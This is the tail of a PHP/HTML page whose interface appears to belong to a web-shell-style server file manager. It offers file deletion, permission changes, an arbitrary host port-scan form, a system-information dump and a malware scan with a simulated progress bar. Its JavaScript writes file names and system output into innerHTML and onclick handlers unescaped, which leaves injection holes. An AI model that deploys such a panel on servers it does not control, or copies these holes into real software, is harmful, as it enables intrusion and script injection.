                                </thead>
                                <tbody id="suspiciousTableBody">
                                    <!-- Results populated by JavaScript -->
                                </tbody>
                            </table>
                            <p id="noSuspiciousResults" class="p-4 text-center text-green-400 hidden">No suspicious files detected</p>
                        </div>
                    </div>

                    <div id="safeContent" class="scan-panel">
                        <div class="max-h-64 overflow-y-auto border border-gray-700 rounded-lg">
                            <table class="result-table w-full text-sm">
                                <thead>
                                    <tr class="sticky top-0 bg-gray-800">
                                        <th class="p-2 text-green-400 text-left">File</th>
                                        <th class="p-2 text-green-400 text-left hidden md:table-cell">Score</th>
                                        <th class="p-2 text-green-400 text-center">Actions</th>
                                    </tr>
                                </thead>
                                <tbody id="safeTableBody">
                                    <!-- Results populated by JavaScript -->
                                </tbody>
                            </table>
                            <p id="noSafeResults" class="p-4 text-center text-green-400 hidden">No safe files to display</p>
                        </div>
                    </div>
                </div>

                <div class="flex justify-end mt-6">
                    <button type="button" onclick="closeModal('scanModal')" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Close</button>
                </div>
            </div>
        </div>

        <!-- Port Scan Modal -->
        <div id="portScanModal" class="modal-overlay fixed inset-0 z-50 flex items-center justify-center hidden">
            <div class="modal-panel p-6 rounded-xl w-full max-w-md shadow-2xl">
                <h2 class="text-2xl font-bold mb-4 text-gray-400">Network Port Analysis</h2>
                <form method="POST" class="space-y-4">
                    <input type="text" name="scan_host" placeholder="Host/IP Address" required class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-gray-500 text-white">
                    <input type="text" name="scan_ports" placeholder="Ports (e.g., 80,443,21,22)" required class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-gray-500 text-white">
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="closeModal('portScanModal')" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Cancel</button>
                        <button type="submit" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Analyze</button>
                    </div>
                </form>
            </div>
        </div>

        <!-- System Info Modal -->
        <div id="systemInfoModal" class="modal-overlay fixed inset-0 z-50 flex items-center justify-center hidden">
            <div class="modal-panel p-6 rounded-xl w-full max-w-4xl h-[90vh] shadow-2xl overflow-y-auto">
                <h2 class="text-2xl font-bold mb-4 text-gray-400">System Configuration</h2>
                <div id="systemInfoContent" class="overflow-x-auto">
                    Loading System Information...
                </div>
                <input type="hidden" id="systemInfoRawContent" value="<?php echo isset($_SESSION['system_information']) ? htmlspecialchars($_SESSION['system_information']) : ''; ?>">
                <?php unset($_SESSION['system_information']); ?>
                <div class="flex justify-end mt-4">
                    <button type="button" onclick="closeModal('systemInfoModal')" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Close</button>
                </div>
            </div>
        </div>
        
    </div>

    <script>
        // Modal Management
        function openModal(modalId) {
            document.getElementById(modalId).classList.remove('hidden');
        }

        function closeModal(modalId) {
            document.getElementById(modalId).classList.add('hidden');
        }

        function togglePanel(panelId) {
            const panelContent = document.getElementById(panelId);
            const panelIcon = document.getElementById(panelId.replace('Content', 'Icon'));
            if (panelContent.style.display === 'block') {
                panelContent.style.display = 'none';
                panelIcon.classList.remove('fa-chevron-up');
                panelIcon.classList.add('fa-chevron-down');
            } else {
                panelContent.style.display = 'block';
                panelIcon.classList.remove('fa-chevron-down');
                panelIcon.classList.add('fa-chevron-up');
            }
        }

        // Rename Modal
        function openRenameModal(oldName, encodedOldName) {
            document.getElementById('current_resource_name').textContent = oldName;
            document.getElementById('rename_original_name').value = encodedOldName;
            document.getElementById('rename_new_input').value = oldName;
            openModal('renameModal');
        }

        // Permission Modal
        function openPermissionModal(itemName, encodedItem, currentPerms, isDirectory) {
            document.getElementById('permission_resource_name').textContent = itemName;
            document.getElementById('permission_target_encoded').value = encodedItem;
            document.getElementById('permission_current_value').textContent = currentPerms;
            document.getElementById('permission_mode_input').value = currentPerms.slice(-3);
            
            const recursiveCheckbox = document.getElementById('permission_recursive');
            if (isDirectory) {
                recursiveCheckbox.checked = false; 
                recursiveCheckbox.parentElement.classList.remove('hidden');
            } else {
                recursiveCheckbox.checked = false;
                recursiveCheckbox.parentElement.classList.add('hidden');
            }
            openModal('permissionModal');
        }

        // Bulk Actions
        function validateBulkAction(form) {
            const selectedCount = document.querySelectorAll('input[name="selected_resources[]"]:checked').length;
            const targetAction = document.activeElement.name;

            if (selectedCount === 0) {
                alert("No resources selected for bulk operation");
                return false;
            }

            if (targetAction === 'bulk_permission_update') {
                const modeInput = document.getElementById('bulk_permission_mode').value.trim();
                const modeRegex = /^[0-7]{3,4}$/;
                if (!modeRegex.test(modeInput)) {
                    alert("Invalid permission mode format");
                    return false;
                }
            }
            
            const selectedItems = document.querySelectorAll('input[name="selected_resources[]"]:checked');
            selectedItems.forEach(item => {
                const hiddenInput = document.createElement('input');
                hiddenInput.type = 'hidden';
                hiddenInput.name = 'selected_resources[]';
                hiddenInput.value = item.value;
                form.appendChild(hiddenInput);
            });
            
            return true;
        }

        const selectAllCheckbox = document.getElementById('selectAllResources');
        const resourceCheckboxes = document.querySelectorAll('input[name="selected_resources[]"]');
        
        selectAllCheckbox.addEventListener('change', function() {
            resourceCheckboxes.forEach(checkbox => {
                checkbox.checked = this.checked;
            });
            updateBulkActionButton();
        });

        resourceCheckboxes.forEach(checkbox => {
            checkbox.addEventListener('change', updateBulkActionButton);
        });

        function updateBulkActionButton() {
            const checkedCount = document.querySelectorAll('input[name="selected_resources[]"]:checked').length;
            const bulkActionButton = document.getElementById('bulkActionButton');
            const selectedCountSpan = document.getElementById('selectedResourceCount');
            
            if (selectedCountSpan) {
                selectedCountSpan.textContent = checkedCount;
            }

            if (checkedCount > 0) {
                bulkActionButton.classList.remove('opacity-50', 'cursor-not-allowed');
                bulkActionButton.disabled = false;
                bulkActionButton.innerHTML = `<i class="fa-solid fa-screwdriver-wrench mr-1"></i> Bulk Operations (${checkedCount} selected)`;
            } else {
                bulkActionButton.classList.add('opacity-50', 'cursor-not-allowed');
                bulkActionButton.disabled = true;
                bulkActionButton.innerHTML = `<i class="fa-solid fa-screwdriver-wrench mr-1"></i> Bulk Operations (0 selected)`;
            }
        }

        // Security Scan Functionality
        document.addEventListener('DOMContentLoaded', function() {
            const startScanButton = document.getElementById('startScanButton');
            if (startScanButton) {
                startScanButton.addEventListener('click', startSecurityScan);
            }

            // Tab switching
            document.querySelectorAll('.scan-tab').forEach(tab => {
                tab.addEventListener('click', function() {
                    const tabName = this.getAttribute('data-tab');
                    
                    // Update active tab
                    document.querySelectorAll('.scan-tab').forEach(t => t.classList.remove('active'));
                    this.classList.add('active');
                    
                    // Update active content
                    document.querySelectorAll('.scan-panel').forEach(panel => panel.classList.remove('active'));
                    document.getElementById(tabName + 'Content').classList.add('active');
                });
            });

            // System Info Modal
            const systemInfoContent = document.getElementById('systemInfoRawContent');
            if (systemInfoContent && systemInfoContent.value) {
                openModal('systemInfoModal');
                document.getElementById('systemInfoContent').innerHTML = systemInfoContent.value;
            }
        });

        function startSecurityScan() {
            const scanControls = document.getElementById('scanControls');
            const scanProgress = document.getElementById('scanProgress');
            const scanResults = document.getElementById('scanResults');
            
            scanControls.classList.add('hidden');
            scanProgress.classList.remove('hidden');
            scanResults.classList.add('hidden');

            const scanData = new FormData();
            scanData.append('security_scan_request', '1');
            scanData.append('scan_directory', '<?php echo base64_encode($activeDirectory); ?>');

            fetch('', {
                method: 'POST',
                body: scanData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    displayScanResults(data.results);
                } else {
                    alert('Scan failed: ' + data.error);
                    resetScanInterface();
                }
            })
            .catch(error => {
                console.error('Scan error:', error);
                alert('Scan failed');
                resetScanInterface();
            });

            // Simulate progress for better UX
            simulateScanProgress();
        }

        function simulateScanProgress() {
            let progress = 0;
            const progressBar = document.getElementById('progressBarFill');
            const progressPercent = document.getElementById('progressPercentage');
            const currentFile = document.getElementById('currentFilePath');
            
            const progressInterval = setInterval(() => {
                progress += Math.random() * 10;
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(progressInterval);
                }
                
                progressBar.style.width = progress + '%';
                progressPercent.textContent = Math.round(progress) + '%';
                
                // Simulate file processing
                const fakeFiles = ['config.php', 'index.html', 'library.inc', 'module.php'];
                currentFile.textContent = 'Processing: ' + fakeFiles[Math.floor(Math.random() * fakeFiles.length)];
                
            }, 500);
        }

        function displayScanResults(results) {
            const scanProgress = document.getElementById('scanProgress');
            const scanResults = document.getElementById('scanResults');
            
            scanProgress.classList.add('hidden');
            scanResults.classList.remove('hidden');

            // Update counters
            document.getElementById('maliciousCount').textContent = results.malicious.length;
            document.getElementById('suspiciousCount').textContent = results.suspicious.length;
            document.getElementById('scannedTotalCount').textContent = results.total;
            
            document.getElementById('maliciousTabCount').textContent = results.malicious.length;
            document.getElementById('suspiciousTabCount').textContent = results.suspicious.length;
            document.getElementById('safeTabCount').textContent = results.safe.length;

            // Populate tables
            populateResultTable('malicious', results.malicious);
            populateResultTable('suspicious', results.suspicious);
            populateResultTable('safe', results.safe);
        }

        function populateResultTable(type, items) {
            const tbody = document.getElementById(type + 'TableBody');
            const noResults = document.getElementById('no' + type.charAt(0).toUpperCase() + type.slice(1) + 'Results');
            
            tbody.innerHTML = '';
            
            if (items.length === 0) {
                noResults.classList.remove('hidden');
                return;
            }
            
            noResults.classList.add('hidden');
            
            items.forEach(item => {
                const row = document.createElement('tr');
                row.className = 'border-b border-gray-700';
                
                row.innerHTML = `
                    <td class="p-2">
                        <div class="flex items-center">
                            <span class="text-xs font-mono">${item.file}</span>
                        </div>
                        <div class="text-xs text-gray-500 mt-1">${item.reason}</div>
                    </td>
                    <td class="p-2 text-gray-400 hidden md:table-cell">${item.score}</td>
                    <td class="p-2 text-center">
                        <button onclick="location.href='?edit_resource=<?php echo base64_encode($activeDirectory . DIRECTORY_SEPARATOR); ?>' + btoa('${item.full_path}')" class="text-yellow-400 hover:text-yellow-500 p-1 transition duration-150" title="Inspect">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </button>
                        <button onclick="if(confirm('Delete ${item.file}?')) location.href='?<?php echo $pathQueryParameter; ?>=<?php echo encodeDirectoryPath($activeDirectory); ?>&delete_resource=' + btoa('${item.file}')" class="text-red-600 hover:text-red-700 p-1 transition duration-150" title="Delete">
                            <i class="fa-solid fa-trash-can"></i>
                        </button>
                    </td>
                `;
                
                tbody.appendChild(row);
            });
        }

        function resetScanInterface() {
            document.getElementById('scanControls').classList.remove('hidden');
            document.getElementById('scanProgress').classList.add('hidden');
            document.getElementById('scanResults').classList.add('hidden');
        }

        // Close modals on outside click
        document.addEventListener('click', function(event) {
            if (event.target.classList.contains('modal-overlay')) {
                event.target.classList.add('hidden');
            }
        });

        // Initialize
        updateBulkActionButton();
    </script>
</body>
</html>